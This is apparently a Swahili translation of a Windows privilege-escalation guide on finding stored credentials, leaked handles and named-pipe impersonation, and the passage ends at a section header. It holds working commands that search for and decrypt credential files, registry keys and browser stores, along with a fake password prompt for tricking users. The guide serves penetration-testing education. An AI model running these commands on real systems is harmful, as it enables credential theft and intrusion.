Baadhi ya plugins za Java server husambazwa kama JAR archives kwenye directory ya `plugins` ya server. Plugin maalum inayosomeka inaweza kuwa na usanidi au bytecode yenye credential ya service iliyopachikwa. Kagua archive kwa idhini pekee na usijumuishe secrets zilizorejeshwa kwenye matokeo ya kawaida ya enumeration. Njia ya plugin pekee haithibitishi kuwa kuna secret, na nywila ya service iliyorejeshwa husababisha ruhusa za juu zaidi tu ikiwa pia ni halali kwa akaunti yenye ruhusa za juu zaidi. Kagua ACLs za faili husika na ubadilishe credentials zilizotumika tena kwa secrets tofauti. Tazama [PaperMC's plugin installation guide](https://docs.papermc.io/paper/adding-plugins/) kwa mpangilio wa directory na [Oracle's JAR documentation](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa maudhui ya archive.

### Credentials za embedded database ya Openfire

Usakinishaji wa Openfire unaotumia embedded database unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` pamoja na property ya `passwordKey`. [User-provider documentation](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) ya Openfire inasema nywila zinaweza kuhifadhiwa kama maandishi wazi au kusimbwa fiche kwa key iliyohifadhiwa kwenye property hiyo. Nywila iliyorejeshwa ni muhimu kwa kupata ruhusa za juu zaidi tu ikiwa bado ni halali kwa utambulisho wenye ruhusa za juu zaidi; jina la faili pekee halithibitishi ufikiaji wa kusoma wala matumizi tena ya credential. Njia hiyo ni kidokezo cha inventory, kwa hiyo usijumuishe maudhui ya database na credentials kwenye matokeo ya kawaida ya enumeration.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kufichua ports na interface ya bind iliyosanidiwa kwa admin console hata ikiwa database ya nje inatumika. Kwa kawaida Openfire hufunga admin console kwenye loopback; hata hivyo, akaunti ya local bado inaweza kufikia anwani hiyo ikiwa listener inafanya kazi. Kagua listener halisi, jukumu la admin lililoidhinishwa, sera ya kupakia plugins na utambulisho wa Openfire service kwa pamoja. Admin anayeweza kusakinisha plugin anaweza kusababisha msimbo wa plugin kufanya kazi katika muktadha wa service, ambao unaweza kuwa na ruhusa za juu sana ikiwa service inaendeshwa kama LocalSystem. Nywila inayolingana ya akaunti au njia ya usanidi inayosomeka pekee haithibitishi ufikiaji wa admin console au utekelezaji wa msimbo. Tazama vendor's [installation and plugin-management guide](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [plugin-upload API property](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa forensic management server

Usanidi wa Velociraptor server, ambao mara nyingi huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya internal CA. Ikiwa mtumiaji mwenye ruhusa za chini anaweza kusoma key hiyo, anaweza kuweza kutengeneza client certificate ya API. Ikiwa hili litasababisha ruhusa za juu zaidi hutegemea roles za watumiaji wa server, ufikikaji wa API na utambulisho ambao server au target agent hutumia. Client configuration huwa na material tofauti; kuipata hakuthibitishi ufikiaji wa server CA. Baadhi ya deployments huhifadhi CA private key nje ya mtandao, kwa hiyo huenda usanidi wa server unaosomeka usiwe na signing key.

Kwenye Windows server, kagua ACL ya usanidi wa **server** kwenye installation directory yake na nakala zozote za backup zilizolindwa. Eneo moja linalowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa kwa service ikiwa ni tofauti. Thibitisha kuwa utambulisho wa sasa unaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha private key kwenye logs au matokeo ya enumeration. Workflow ya vendor ya `config api_client` hutumia CA key kutoa client certificate, lakini role inayotumika upande wa server pia inahitajika; kuunda au kubadilisha role kunaweza kuhitaji ruhusa ya kuandika kwenye datastore au kuwasha upya server. Utambulisho wa server wenye ruhusa za juu uliopo tayari unaweza kutoa njia hata kama ruhusa hizo za kuandika hazipatikani. API queries zenye haki za utekelezaji hufanya kazi katika muktadha husika wa server au agent, ambao unaweza kuwa na ruhusa za juu sana.

Linda usanidi wa server na backups kwa ACLs zenye vizuizi vikali, hifadhi CA signing key nje ya mtandao inapowezekana, na punguza roles za API na ufikiaji wa listener. Tazama [Velociraptor API documentation](https://docs.velociraptor.app/docs/server_automation/server_api/) na [security configuration guidance](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni kidhibiti tofauti cha session. Hifadhi yake asilia iliyosimbwa kwa njia fiche inaweza kuwa `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ilhali nakala rudufu ya session iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [Mwongozo wa kuhamisha wa SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) unasema kuwa faili zinazohamishwa husimbwa kwa nenosiri na zinaweza kuwa na sessions, funguo, scripts, lebo na mahusiano; [jukwaa lake la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linataja hifadhi asilia. Kagua ruhusa na njia za faili kwanza. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kuwa credential yoyote iliyohifadhiwa bado ni halali au ina haki za juu zaidi.

### Funguo za mwenyeji wa SSH za Putty

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Funguo za SSH kwenye sajili

Funguo za faragha za SSH zinaweza kuhifadhiwa ndani ya ufunguo wa sajili `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya njia hiyo, huenda likawa ni ufunguo wa SSH uliohifadhiwa. Huhifadhiwa kwa njia fiche lakini unaweza kufichuliwa kwa urahisi ukitumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki mfumo unapowashwa, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana mbinu hii haitumiki tena. Nilijaribu kuunda baadhi ya funguo za ssh, kuziongeza kwa `ssh-add` na kuingia kwenye mashine kupitia ssh. Usajili HKCU\Software\OpenSSH\Agent\Keys haupo, na procmon haikuonyesha matumizi ya `dpapi.dll` wakati wa uthibitishaji wa funguo zisizolingana.

### Faili zisizohudumiwa

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Maudhui ya mfano:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala rudufu za SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka zinaweza pia kuwa na hive za `SAM`, `SECURITY` na `SYSTEM` za mfumo offline. Kipaumbele kiwe saraka za backup au image zinazofikika ndani ya mashine, na kagua **majina ya faili zilizomo kwenye image** kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hive zimefichuliwa, na image za kawaida za `install.wim`, `boot.wim` na recovery mara nyingi huwa dalili za kupotosha. SMB share ni njia tofauti ya ufikiaji, na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya upeo wa kazi. Tazama mwongozo wa Microsoft kuhusu [Windows images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeleo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Vitambulisho vya Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa kwenye cache

Kipengele kilipatikana hapo awali kilichoruhusu kutumwa kwa akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML kwenye SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, nywila ndani ya GPP hizi, zilizosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliowekwa wazi kwenye nyaraka za umma, zingeweza kusimbuliwa na mtumiaji yeyote aliyethibitishwa. Hili lilileta hatari kubwa, kwani lingeweza kuruhusu watumiaji kupata mamlaka ya juu.

Ili kupunguza hatari hii, kazi ilitengenezwa ya kutafuta faili za GPP zilizohifadhiwa kwenye cache ya ndani zenye sehemu ya "cpassword" isiyo tupu. Faili kama hiyo ikipatikana, kazi hiyo husimbua nenosiri na kurudisha object maalum ya PowerShell. Object hii inajumuisha maelezo kuhusu GPP na eneo la faili, na hivyo kusaidia kutambua na kurekebisha athari hii ya kiusalama.

Tafuta faili hizi katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili kusimbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye taarifa za kuingia:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Kumbukumbu za backup katika webroot ya IIS

Backup ya zamani ya ZIP iliyowekwa moja kwa moja kwenye webroot inayohudumia tovuti inaweza kufichua faili za awali za usanidi na credentials zinazoweza kutumiwa tena. Kagua physical path iliyosanidiwa ya tovuti na kama archive inaweza kufikiwa kupitia HTTP kabla ya kuichukulia kuwa imefichuka. Njia chaguomsingi ya `C:\inetpub\wwwroot` ni njia inayowezekana tu. Orodha ya haraka ya ndani inaweza kuonyesha majina na ukubwa wa faili bila kufungua archives:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la kumbukumbu halithibitishi kwamba ina siri au kwamba kitambulisho kilichopatikana kinatoa ruhusa za juu zaidi.

### Vitambulisho vya OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Kumbukumbu

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba credentials

Unaweza **kumuomba mtumiaji aweke credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (kumbuka kwamba **kumuuliza** mteja moja kwa moja **credentials** ni **hatari sana**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na credentials**

Faili zinazojulikana kuwa wakati fulani zilikuwa na **passwords** katika **maandishi wazi** au **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 databases kwa kawaida hutumia kiendelezi cha `.psafe3`. Chukulia jina la faili linalolingana kama kiashiria cha vault iliyosimbwa; kuwepo kwake hakuthibitishi kuwa unaweza kuisoma, kuifungua, au kutumia credentials zozote zilizohifadhiwa humo. Kagua profiles za watumiaji zinazoweza kufikiwa na mizizi ya file-sharing iliyosanidiwa unapokagua mahali faili hizo zimehifadhiwa.

KeePass `.kdbx` inayosomeka pia ni kiashiria tu cha vault iliyosimbwa. Kuifungua kunahitaji master-password halisi pamoja na faili yoyote ya key au vipengele vya akaunti vilivyosaniwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya LM:NT hash kwenye entry, thibitisha akaunti iliyotajwa na kama NT hash ni ya sasa na inakubaliwa na huduma ya NTLM ya lengwa kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Entry ya vault yenyewe haikupi haki za Administrator au SYSTEM; ufikiaji wa huduma ya mbali, haki za akaunti na hatua yoyote tofauti ya utekelezaji wa huduma lazima pia ziwepo. Orodhesha njia ya vault na kama inaweza kusomeka, lakini usichapishe database au credentials zilizohifadhiwa.

Tafuta faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credentials katika RecycleBin

Kagua vipengee vinavyoweza kufikiwa kwenye Recycle Bin ili kupata backups zilizofutwa na kumbukumbu za usanidi, pamoja na faili ambazo majina yake yanataja credentials waziwazi. Backup ya `.7z`, `.zip`, au `.rar` inaweza kuwa na manufaa hata ikiwa ina miezi kadhaa na jina lake ni la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa kwenye rekodi ya `$I`, na faili iliyofutwa kama ingizo lake linalolingana la `$R`; kagua metadata na ruhusa ya kusoma ya utambulisho wa sasa kabla ya kufungua kumbukumbu. Uwezo wa kuona hutegemea volume, SID ya mtumiaji, na ruhusa za faili, kwa hivyo orodha tupu haithibitishi kuwa hakuna backup inayoweza kurejeshwa. Chukulia jina la kumbukumbu kama kitu kinachofaa kukaguliwa, si uthibitisho kwamba lina secret halali.

Faili ya `.pfx` iliyofutwa ambayo unaweza kufikia inaweza pia kuwa kidokezo cha **code-signing**. Ikiwa ina private key inayoweza kufikiwa, key hiyo inaweza kusaini script ya PowerShell iliyobadilishwa; [PowerShell inahitaji certificate ya code-signing iliyo na private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [sheria za AppLocker za publisher hukagua utambulisho wa msaini na upeo wa sheria](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti unahitaji utambulisho wa sasa uweze kurekebisha script husika, sheria inayotumika ikubali signature inayotokana nayo kwa script na akaunti lengwa, na scheduled task au mchakato mwingine wenye ruhusa za juu zaidi uiiendeshe kweli. Jina la faili la `.pfx`, subject ya certificate, au script inayoweza kuandikwa pekee havithibitishi mnyororo huo. Kagua metadata, ACL, sera, na amri ya scheduled task kabla ya kufungua nyenzo za private key au kuwasha task.

Pia kagua hifadhidata za profile za messaging client, madokezo, na faili zilizopokelewa zinazoweza kufikiwa ili kupata vidokezo vya credentials. Export ya BitLocker recovery inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya kumbukumbu ya backup yenye jina. Nyenzo hizo zinaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa, iliyo na backups za zamani; kagua volume na kumbukumbu hiyo tu ikiwa unaidhinishwa kufikia. Ikiwa backup ina `NTDS.dit`, kurejesha credentials za domain nje ya mtandao kunahitaji pia hive ya `SYSTEM` inayolingana, kama ilivyoelezwa katika [utaratibu wa backups na vikundi vyenye ruhusa za juu](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kuwa kuna recovery key inayoweza kutumika au backup ya domain.

Ili **kurejesha passwords** zilizohifadhiwa na programu kadhaa, unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Vifunguo vingine vinavyowezekana vya registry vyenye credentials**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Vivinjari

Unapaswa kuangalia hifadhidata ambazo nywila za **Chrome, Edge, au Firefox** huhifadhiwa.\
Pia angalia historia, alamisho na vipendwa vya vivinjari ili kuona kama huenda **nywila zimehifadhiwa** humo.

Kwa wasifu wa kawaida wa Edge wa mtumiaji wa sasa, `Login Data` iko chini ya `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, huku `Local State` ikiwa katika saraka yake mama ya `User Data`. [Microsoft inaeleza eneo la kawaida la wasifu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); wasifu mwingine au sera ya `UserDataDir` inaweza kuhamisha eneo hilo. Kuwepo kwa faili ni kidokezo tu cha mahali pa kutafuta taarifa za uthibitishaji: hakikisha faili zinaweza kusomwa, muktadha wa DPAPI wa mtumiaji husika au nyenzo nyingine za ufunguo zilizoidhinishwa zinapatikana, na kama login iliyohifadhiwa ni ya akaunti yenye mapendeleo zaidi. Kuhesabu faili kwa kutumia njia pekee hakuhitaji kufungua hifadhidata au kuchapisha nywila zilizofichuliwa.

Kwa Firefox, [Mozilla inaeleza](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kwamba `key4.db` na `logins.json` za wasifu ni faili zinazohusiana za ufunguo na login zilizosimbwa kwa njia fiche. Kuwepo kwake ni kidokezo tu: hakikisha faili zote mbili zinaweza kusomwa, kama kuna taarifa zilizohifadhiwa, na kama Primary Password inalinda ufunguo kabla ya kuhitimisha kwamba taarifa za uthibitishaji zinaweza kutumika. Ikiwa taarifa ya uthibitishaji iliyorejeshwa ni ya akaunti ya domain, kagua kando haki halisi za udhibiti wa kikundi za akaunti hiyo na haki za kikundi za [kusoma au kufungua nenosiri la LAPS](../active-directory-methodology/laps.md); mabaki ya kivinjari pekee hayathibitishi kuwa kuna njia ya kupata haki za msimamizi.

Tools za kutoa nywila kutoka kwenye vivinjari:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayowezesha **mawasiliano** kati ya vipengele vya programu vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kwa kutumia class ID (CLSID)** na kila kipengele hutoa utendaji kupitia kiolesura kimoja au zaidi, vinavyotambuliwa kwa kutumia interface IDs (IIDs).

Class na interface za COM hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSID za registry hii unaweza kupata registry tegemezi **InProcServer32**, ambayo ina **thamani chaguomsingi** inayoelekeza kwenye **DLL** na thamani inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya Vivinjari - COM DLL Overwriting: Ndani ya CLSID za registry hii unaweza kupata registry tegemezi InProcServer32, ambayo ina thamani chaguomsingi inayoelekeza kwenye DLL na thamani...](<../../images/image (729).png>)

Kimsingi, ukiweza **kubadilisha DLL yoyote** itakayotekelezwa, unaweza **kupandisha mapendeleo** ikiwa DLL hiyo itatekelezwa na mtumiaji mwingine.

Ili kujifunza jinsi washambuliaji wanavyotumia COM Hijacking kama mbinu ya kudumu, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa jumla wa nywila kwenye faili na registry**

**Tafuta yaliyomo kwenye faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili lenye jina fulani**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta kwenye Registry majina ya funguo na nywila**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoitengeneza ili **itekeleze kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zenye nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **majina ya watumiaji** na **nywila** za zana kadhaa zinazohifadhi data hii katika maandishi ya wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handles

Fikiria kwamba **process inayoendeshwa kama SYSTEM inafungua process mpya** (`OpenProcess()`) yenye **ufikiaji kamili**. Process hiyo hiyo **pia huunda process mpya** (`CreateProcess()`) **yenye privileges za chini lakini ikirithi handles zote zilizo wazi za process kuu**.\
Kisha, ikiwa una **ufikiaji kamili wa process yenye privileges za chini**, unaweza kuchukua **handle iliyo wazi ya process yenye privileges za juu iliyoundwa** kwa `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili lingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia handles nyingine zilizo wazi za processes na threads zilizorithiwa zikiwa na viwango tofauti vya permissions (si ufikiaji kamili tu)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za shared memory, zinazoitwa **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya processes.

Windows ina kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, wenye majukumu yanayofafanuliwa kama **named pipe server** na **named pipe client**.

Client inapotuma data kupitia pipe, **server** iliyosanidi pipe hiyo inaweza **kuchukua utambulisho** wa **client**, iwapo ina haki zinazohitajika za **SeImpersonate**. Kutambua **process yenye privileges za juu** inayowasiliana kupitia pipe unayoweza kuiga kunakupa fursa ya **kupata privileges za juu zaidi** kwa kuchukua utambulisho wa process hiyo inapoingiliana na pipe uliyoanzisha. Maelekezo ya kutekeleza shambulio kama hili yanapatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, tool ifuatayo hukuruhusu **kunasa mawasiliano ya named pipe kwa tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii hukuruhusu kuorodhesha na kuona pipes zote ili kutafuta privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

